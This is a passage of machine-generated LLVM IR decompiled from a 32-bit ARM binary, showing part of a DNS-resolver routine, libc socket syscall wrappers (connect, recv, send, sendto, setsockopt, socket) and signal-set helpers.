dec_label_pc_147dc:                               ; preds = %dec_label_pc_147d4
  store i32 %v2_147d4, i32* @r4, align 4
  %v0_147e0 = load i32, i32* @r7, align 4
  %v2_147e0 = add i32 %v0_147e0, %v1_147d4
  store i32 %v2_147e0, i32* @r7, align 4
  br label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147c4, %dec_label_pc_147dc
  %v0_147ec = phi i32 [ %v2_147d4, %dec_label_pc_147dc ], [ %v0_147ec.pre, %dec_label_pc_147c4 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_1479c, align 4
  %tmp31 = icmp ult i32 %v0_147ec, 4
  br i1 %tmp31, label %dec_label_pc_14a78, label %dec_label_pc_147f8

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147e4
  %v0_147f8 = load i32, i32* @r4, align 4
  %v1_147f8 = add i32 %v0_147f8, -4
  store i32 %v1_147f8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_147f8, 8
  br i1 %tmp32, label %dec_label_pc_14a78, label %dec_label_pc_14804

dec_label_pc_14804:                               ; preds = %dec_label_pc_147f8
  %v1_14804 = add i32 %v0_147f8, -12
  store i32 %v1_14804, i32* %r3.global-to-local, align 4
  %v0_14808 = load i32, i32* @r7, align 4
  %v1_14808 = add i32 %v0_14808, 4
  store i32 %v1_14808, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_14814 = inttoptr i32 %v1_14808 to i32*
  store i32 %v0_14808, i32* %v3_14814, align 4
  %v0_14818 = load i32, i32* @r5, align 4
  %v1_14818 = load i32, i32* @sb, align 4
  %v2_14818 = add i32 %v1_14818, 4
  %v3_14818 = inttoptr i32 %v2_14818 to i32*
  store i32 %v0_14818, i32* %v3_14818, align 4
  %tmp33 = icmp ult i32 %v1_14804, 32
  br i1 %tmp33, label %dec_label_pc_14a78, label %dec_label_pc_14820

dec_label_pc_14820:                               ; preds = %dec_label_pc_14804
  %v0_14820 = load i32, i32* @r4, align 4
  %v1_14820 = add i32 %v0_14820, -44
  store i32 %v1_14820, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_14820, 256
  br i1 %tmp34, label %dec_label_pc_14a78, label %dec_label_pc_1482c

dec_label_pc_1482c:                               ; preds = %dec_label_pc_14820
  %v0_1482c = load i32, i32* @r7, align 4
  %v1_1482c = add i32 %v0_1482c, 44
  store i32 %v1_1482c, i32* @r6, align 4
  %v1_14830 = add i32 %v0_1482c, 12
  store i32 %v1_14830, i32* %r3.global-to-local, align 4
  %v0_14834 = load i32, i32* @fp, align 4
  store i32 %v0_14834, i32* @r1, align 4
  store i32 %v1_14820, i32* %r2.global-to-local, align 4
  store i32 %v1_1482c, i32* %r0.global-to-local, align 4
  %v3_14844 = call i32 @strncpy(i32 %v1_1482c, i32 %v0_14834, i32 %v1_14820)
  store i32 %v1_14830, i32* %ip.global-to-local, align 4
  %v0_1484c = load i32, i32* @r6, align 4
  %v1_1484c = load i32, i32* @r7, align 4
  %v2_1484c = add i32 %v1_1484c, 12
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v0_1484c, i32* %v3_1484c, align 4
  %v0_14850 = load i32, i32* @fp, align 4
  store i32 %v0_14850, i32* %r0.global-to-local, align 4
  %v0_14854 = load i32, i32* @r5, align 4
  %v1_14854 = load i32, i32* %ip.global-to-local, align 4
  %v2_14854 = add i32 %v1_14854, 4
  %v3_14854 = inttoptr i32 %v2_14854 to i32*
  store i32 %v0_14854, i32* %v3_14854, align 4
  %v0_14858 = load i32, i32* @r7, align 4
  %v2_1485c = inttoptr i32 %v0_14850 to i8*
  %v3_1485c = call i32 @inet_aton(i8* %v2_1485c, i32 %v0_14858)
  store i32 %v3_1485c, i32* %r0.global-to-local, align 4
  %v2_14860 = icmp eq i32 %v3_1485c, 0
  br i1 %v2_14860, label %dec_label_pc_148a4, label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_1482c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_14870 = load i32, i32* @sl, align 4
  %v2_14870 = add i32 %v1_14870, 8
  %v3_14870 = inttoptr i32 %v2_14870 to i32*
  store i32 2, i32* %v3_14870, align 4
  %v0_14874 = load i32, i32* %r3.global-to-local, align 4
  %v2_14874 = mul i32 %v0_14874, 2
  %v1_14878 = load i32, i32* @sl, align 4
  %v2_14878 = add i32 %v1_14878, 12
  %v3_14878 = inttoptr i32 %v2_14878 to i32*
  store i32 %v2_14874, i32* %v3_14878, align 4
  %v3_1487c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1487c, i32* %r2.global-to-local, align 4
  store i32 %v1_14830, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_14888 = load i32, i32* @r5, align 4
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v0_1488c = load i32, i32* @sl, align 4
  %v2_1488c = inttoptr i32 %v3_1487c to i32*
  store i32 %v0_1488c, i32* %v2_1488c, align 4
  %v0_14890 = load i32, i32* @r6, align 4
  %v1_14890 = load i32, i32* @sl, align 4
  %v2_14890 = inttoptr i32 %v1_14890 to i32*
  store i32 %v0_14890, i32* %v2_14890, align 4
  %v0_14894 = load i32, i32* @sb, align 4
  %v1_14894 = load i32, i32* @sl, align 4
  %v2_14894 = add i32 %v1_14894, 16
  %v3_14894 = inttoptr i32 %v2_14894 to i32*
  store i32 %v0_14894, i32* %v3_14894, align 4
  %v0_14898 = load i32, i32* %r3.global-to-local, align 4
  %v1_14898 = load i32, i32* @sl, align 4
  %v2_14898 = add i32 %v1_14898, 4
  %v3_14898 = inttoptr i32 %v2_14898 to i32*
  store i32 %v0_14898, i32* %v3_14898, align 4
  %v0_1489c = load i32, i32* @r5, align 4
  %v1_1489c = load i32, i32* %ip.global-to-local, align 4
  %v2_1489c = inttoptr i32 %v1_1489c to i32*
  store i32 %v0_1489c, i32* %v2_1489c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_148a4:                               ; preds = %dec_label_pc_1482c
  %v2_148a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_148a4, i32* @r5, align 4
  %v1_148a8 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2d5cc.1130 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_148a4, i32* @r0, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_148c0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2d5cc.1130 to i32), i32* %r0.global-to-local, align 4
  %v1_148d0 = call i32 @__pthread_return_0()
  store i32 %v2_148a4, i32* @r0, align 4
  %v2_148dc = load i32, i32* @global_var_33944.1135, align 4
  store i32 %v2_148dc, i32* @r4, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_148ec = call i32 @__pthread_return_void()
  %v2_148f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_33938.1138 to i32), i32* %r3.global-to-local, align 4
  %v0_14904 = load i32, i32* @fp, align 4
  store i32 %v0_14904, i32* %r0.global-to-local, align 4
  %v2_14908 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_14908, i32* %ip.global-to-local, align 4
  %v0_1490c = load i32, i32* @r4, align 4
  store i32 %v0_1490c, i32* %r2.global-to-local, align 4
  %v6_14920 = inttoptr i32 %v0_14904 to i8*
  %v7_14920 = call i32 @__dns_lookup(i8* %v6_14920, i32 1, i32 %v0_1490c, i32 ptrtoint (i32* @global_var_33938.1138 to i32), i32 %v2_148f8, i32 %v2_14908)
  store i32 %v7_14920, i32* %r0.global-to-local, align 4
  %v1_14924 = icmp slt i32 %v7_14920, 0
  br i1 %v1_14924, label %.dec_label_pc_14a50_crit_edge, label %dec_label_pc_14934

.dec_label_pc_14a50_crit_edge:                    ; preds = %dec_label_pc_148a4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14934:                               ; preds = %dec_label_pc_148a4
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_14948 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_14948, 255
  br i1 %tmp35, label %dec_label_pc_149e4, label %dec_label_pc_14950

dec_label_pc_14950:                               ; preds = %dec_label_pc_14934
  %v3_14950 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_14950, i32* @r0, align 4
  %v0_14954 = call i32 @free()
  %v3_14958 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14958, i32* @r0, align 4
  %v0_1495c = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_149e4:                               ; preds = %dec_label_pc_14934
  %v3_149e8.pre = load i32, i32* %stack_var_-96, align 4
  %v0_149ec.pre = load i32, i32* @r6, align 4
  store i32 %v1_14948, i32* %r2.global-to-local, align 4
  store i32 %v3_149e8.pre, i32* @r1, align 4
  store i32 %v0_149ec.pre, i32* %r0.global-to-local, align 4
  %v3_149f0 = call i32 @strncpy(i32 %v0_149ec.pre, i32 %v3_149e8.pre, i32 %v1_14948)
  %v3_149f4 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_149f4, i32* @r0, align 4
  %v0_149f8 = call i32 @free()
  store i32 %v0_149f8, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_14a00 = icmp eq i32 %tmp7, 1
  br i1 %v7_14a00, label %dec_label_pc_14a08, label %dec_label_pc_14a5c

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149e4
  store i32 4, i32* @r2, align 4
  %v0_14a10 = load i32, i32* @r7, align 4
  store i32 %v0_14a10, i32* @r0, align 4
  %v0_14a14 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_14830, i32* %r2.global-to-local, align 4
  %v1_14a20 = load i32, i32* @sl, align 4
  %v2_14a20 = add i32 %v1_14a20, 8
  %v3_14a20 = inttoptr i32 %v2_14a20 to i32*
  store i32 2, i32* %v3_14a20, align 4
  %v0_14a24 = load i32, i32* %r3.global-to-local, align 4
  %v2_14a24 = mul i32 %v0_14a24, 2
  store i32 %v2_14a24, i32* %r3.global-to-local, align 4
  %v1_14a28 = load i32, i32* @sl, align 4
  %v2_14a28 = add i32 %v1_14a28, 12
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  store i32 %v2_14a24, i32* %v3_14a28, align 4
  %v3_14a2c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14a2c, i32* @r0, align 4
  %v0_14a30 = load i32, i32* @r6, align 4
  %v1_14a30 = load i32, i32* @sl, align 4
  %v2_14a30 = inttoptr i32 %v1_14a30 to i32*
  store i32 %v0_14a30, i32* %v2_14a30, align 4
  %v0_14a34 = load i32, i32* @sb, align 4
  %v1_14a34 = load i32, i32* @sl, align 4
  %v2_14a34 = add i32 %v1_14a34, 16
  %v3_14a34 = inttoptr i32 %v2_14a34 to i32*
  store i32 %v0_14a34, i32* %v3_14a34, align 4
  %v0_14a38 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a38 = load i32, i32* @sl, align 4
  %v2_14a38 = add i32 %v1_14a38, 4
  %v3_14a38 = inttoptr i32 %v2_14a38 to i32*
  store i32 %v0_14a38, i32* %v3_14a38, align 4
  %v0_14a3c = call i32 @free()
  %v3_14a40 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14a40, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14a48 = load i32, i32* @sl, align 4
  %v2_14a48 = inttoptr i32 %v3_14a40 to i32*
  store i32 %v0_14a48, i32* %v2_14a48, align 4
  %v0_14a4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14a4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %.dec_label_pc_14a50_crit_edge, %dec_label_pc_14a08
  %v0_14a54 = phi i32 [ 1, %.dec_label_pc_14a50_crit_edge ], [ %v0_14a4c, %dec_label_pc_14a08 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_14a54, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_149e4
  %v3_14a5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14a5c, i32* @r0, align 4
  %v0_14a60 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a78:                               ; preds = %dec_label_pc_147d4, %dec_label_pc_14820, %dec_label_pc_14804, %dec_label_pc_147f8, %dec_label_pc_147e4
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %bb, %dec_label_pc_147b8, %dec_label_pc_147b0, %dec_label_pc_14758, %dec_label_pc_14a5c, %dec_label_pc_14a50, %dec_label_pc_14950, %dec_label_pc_1486c, %dec_label_pc_14a78
  store i32 %v6_1472c, i32* @r5, align 4
  store i32 %v9_1472c, i32* @r6, align 4
  store i32 %v12_1472c, i32* @r7, align 4
  store i32 %v15_1472c, i32* @r8, align 4
  store i32 %v18_1472c, i32* @sb, align 4
  store i32 %v21_1472c, i32* @sl, align 4
  store i32 %v24_1472c, i32* @fp, align 4
  %v29_14a80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_14a80

; uselistorder directives
  uselistorder i32 %v2_14a24, { 1, 0 }
  uselistorder i32 %v1_14948, { 1, 2, 0 }
  uselistorder i32 %v1_14830, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1482c, { 1, 0, 2 }
  uselistorder i32 %v1_14820, { 2, 1, 0, 3 }
  uselistorder i32 %v0_147ec.pre, { 0, 2, 1 }
  uselistorder i32 %v1_147c8, { 1, 0 }
  uselistorder i32* %v1_1479c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_1473c, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14a7c, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_14a78, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14a50, { 1, 0 }
  uselistorder label %dec_label_pc_147e4, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14aa0 = load i32, i32* @r4, align 4
  store i32 %v3_14aa0, i32* %stack_var_-8, align 4
  %v5_14aa4 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_14aa4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14aa4, -4095
  br i1 %tmp, label %dec_label_pc_14ac4, label %dec_label_pc_14ab4

dec_label_pc_14ab4:                               ; preds = %entry
  %v0_14ab4 = call i32 @__errno_location()
  %v0_14ab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ab8 = sub i32 0, %v0_14ab8
  %v2_14abc = inttoptr i32 %v0_14ab4 to i32*
  store i32 %v1_14ab8, i32* %v2_14abc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ac4

dec_label_pc_14ac4:                               ; preds = %entry, %dec_label_pc_14ab4
  %v0_14ac4 = phi i32 [ %v5_14aa4, %entry ], [ -1, %dec_label_pc_14ab4 ]
  %v2_14ac8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ac8, i32* @r4, align 4
  ret i32 %v0_14ac4

; uselistorder directives
  uselistorder i32 %v5_14aa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ac4, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14acc = load i32, i32* @r4, align 4
  store i32 %v3_14acc, i32* %stack_var_-8, align 4
  %v5_14ad0 = inttoptr i32 %arg3 to i32*
  %v6_14ad0 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_14ad0)
  store i32 %v6_14ad0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_14ad0, -4095
  br i1 %tmp, label %dec_label_pc_14af0, label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %entry
  %v0_14ae0 = call i32 @__errno_location()
  %v0_14ae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ae4 = sub i32 0, %v0_14ae4
  %v2_14ae8 = inttoptr i32 %v0_14ae0 to i32*
  store i32 %v1_14ae4, i32* %v2_14ae8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %entry, %dec_label_pc_14ae0
  %v0_14af0 = phi i32 [ %v6_14ad0, %entry ], [ -1, %dec_label_pc_14ae0 ]
  %v2_14af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14af4, i32* @r4, align 4
  ret i32 %v0_14af0

; uselistorder directives
  uselistorder i32 %v6_14ad0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14af0, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14af8 = load i32, i32* @r4, align 4
  store i32 %v3_14af8, i32* %stack_var_-8, align 4
  %v0_14b00 = call i32 @getsockopt()
  store i32 %v0_14b00, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b00, -4095
  br i1 %tmp, label %dec_label_pc_14b20, label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %entry
  %v0_14b10 = call i32 @__errno_location()
  %v0_14b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b14 = sub i32 0, %v0_14b14
  %v2_14b18 = inttoptr i32 %v0_14b10 to i32*
  store i32 %v1_14b14, i32* %v2_14b18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %entry, %dec_label_pc_14b10
  %v0_14b20 = phi i32 [ %v0_14b00, %entry ], [ -1, %dec_label_pc_14b10 ]
  %v2_14b24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b24, i32* @r4, align 4
  ret i32 %v0_14b20

; uselistorder directives
  uselistorder i32 %v0_14b00, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14b20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b28 = load i32, i32* @r4, align 4
  store i32 %v3_14b28, i32* %stack_var_-8, align 4
  %v5_14b2c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14b2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b2c, -4095
  br i1 %tmp, label %dec_label_pc_14b4c, label %dec_label_pc_14b3c

dec_label_pc_14b3c:                               ; preds = %entry
  %v0_14b3c = call i32 @__errno_location()
  %v0_14b40 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b40 = sub i32 0, %v0_14b40
  %v2_14b44 = inttoptr i32 %v0_14b3c to i32*
  store i32 %v1_14b40, i32* %v2_14b44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b4c

dec_label_pc_14b4c:                               ; preds = %entry, %dec_label_pc_14b3c
  %v0_14b4c = phi i32 [ %v5_14b2c, %entry ], [ -1, %dec_label_pc_14b3c ]
  %v2_14b50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b50, i32* @r4, align 4
  ret i32 %v0_14b4c

; uselistorder directives
  uselistorder i32 %v5_14b2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b4c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b54 = load i32, i32* @r4, align 4
  store i32 %v3_14b54, i32* %stack_var_-8, align 4
  %v5_14b58 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14b58, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b58, -4095
  br i1 %tmp, label %dec_label_pc_14b78, label %dec_label_pc_14b68

dec_label_pc_14b68:                               ; preds = %entry
  %v0_14b68 = call i32 @__errno_location()
  %v0_14b6c = load i32, i32* %r4.global-to-local, align 4
  %v1_14b6c = sub i32 0, %v0_14b6c
  %v2_14b70 = inttoptr i32 %v0_14b68 to i32*
  store i32 %v1_14b6c, i32* %v2_14b70, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %entry, %dec_label_pc_14b68
  %v0_14b78 = phi i32 [ %v5_14b58, %entry ], [ -1, %dec_label_pc_14b68 ]
  %v2_14b7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b7c, i32* @r4, align 4
  ret i32 %v0_14b78

; uselistorder directives
  uselistorder i32 %v5_14b58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b78, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14b80 = load i32, i32* @r4, align 4
  store i32 %v3_14b80, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_14b8c = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_14b8c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b8c, -4095
  br i1 %tmp, label %dec_label_pc_14bac, label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %entry
  %v0_14b9c = call i32 @__errno_location()
  %v0_14ba0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ba0 = sub i32 0, %v0_14ba0
  %v2_14ba4 = inttoptr i32 %v0_14b9c to i32*
  store i32 %v1_14ba0, i32* %v2_14ba4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %entry, %dec_label_pc_14b9c
  %v0_14bac = phi i32 [ %v5_14b8c, %entry ], [ -1, %dec_label_pc_14b9c ]
  %v2_14bb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14bb0, i32* @r4, align 4
  ret i32 %v0_14bac

; uselistorder directives
  uselistorder i32 %v5_14b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bac, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bb4 = load i32, i32* @r4, align 4
  store i32 %v3_14bb4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_14bbc = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_14bbc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14bbc, -4095
  br i1 %tmp, label %dec_label_pc_14bdc, label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %entry
  %v0_14bcc = call i32 @__errno_location()
  %v0_14bd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bd0 = sub i32 0, %v0_14bd0
  %v2_14bd4 = inttoptr i32 %v0_14bcc to i32*
  store i32 %v1_14bd0, i32* %v2_14bd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bdc

dec_label_pc_14bdc:                               ; preds = %entry, %dec_label_pc_14bcc
  %v0_14bdc = phi i32 [ %v5_14bbc, %entry ], [ -1, %dec_label_pc_14bcc ]
  %v2_14be0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14be0, i32* @r4, align 4
  ret i32 %v0_14bdc

; uselistorder directives
  uselistorder i32 %v5_14bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bdc, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14be4 = load i32, i32* @r4, align 4
  store i32 %v3_14be4, i32* %stack_var_-8, align 4
  %v0_14be8 = call i32 @socket()
  store i32 %v0_14be8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14be8, -4095
  br i1 %tmp, label %dec_label_pc_14c08, label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %entry
  %v0_14bf8 = call i32 @__errno_location()
  %v0_14bfc = load i32, i32* %r4.global-to-local, align 4
  %v1_14bfc = sub i32 0, %v0_14bfc
  %v2_14c00 = inttoptr i32 %v0_14bf8 to i32*
  store i32 %v1_14bfc, i32* %v2_14c00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %entry, %dec_label_pc_14bf8
  %v0_14c08 = phi i32 [ %v0_14be8, %entry ], [ -1, %dec_label_pc_14bf8 ]
  %v2_14c0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c0c, i32* @r4, align 4
  ret i32 %v0_14c08

; uselistorder directives
  uselistorder i32 %v0_14be8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c08, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_14c2c, label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %entry
  %v8_14c20 = icmp sgt i32 %arg1, 64
  br i1 %v8_14c20, label %dec_label_pc_14c2c, label %dec_label_pc_14c24

dec_label_pc_14c24:                               ; preds = %dec_label_pc_14c1c
  %v0_14c28 = call i32 @__sigaddset()
  br label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c1c, %entry, %dec_label_pc_14c24
  %v0_14c2c = call i32 @__errno_location()
  %v2_14c34 = inttoptr i32 %v0_14c2c to i32*
  store i32 22, i32* %v2_14c34, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c2c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_14c4c = load i32, i32* @r0, align 4
  %v2_14c4c = inttoptr i32 %v0_14c4c to i8*
  %v3_14c4c = call i32 @__GI_memset(i8* %v2_14c4c, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c58 = load i32, i32* @r4, align 4
  store i32 %v3_14c58, i32* %stack_var_-12, align 4
  %v6_14c58 = load i32, i32* @r5, align 4
  %v10_14c58 = ptrtoint i32* %stack_var_-12 to i32
  %v7_14c5c = icmp eq i32 %arg2, -1
  %v0_14c68.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_14c5c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_14c80

bb:                                               ; preds = %entry
  %v2_14c64 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_14c68.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_14c68.pre, 1
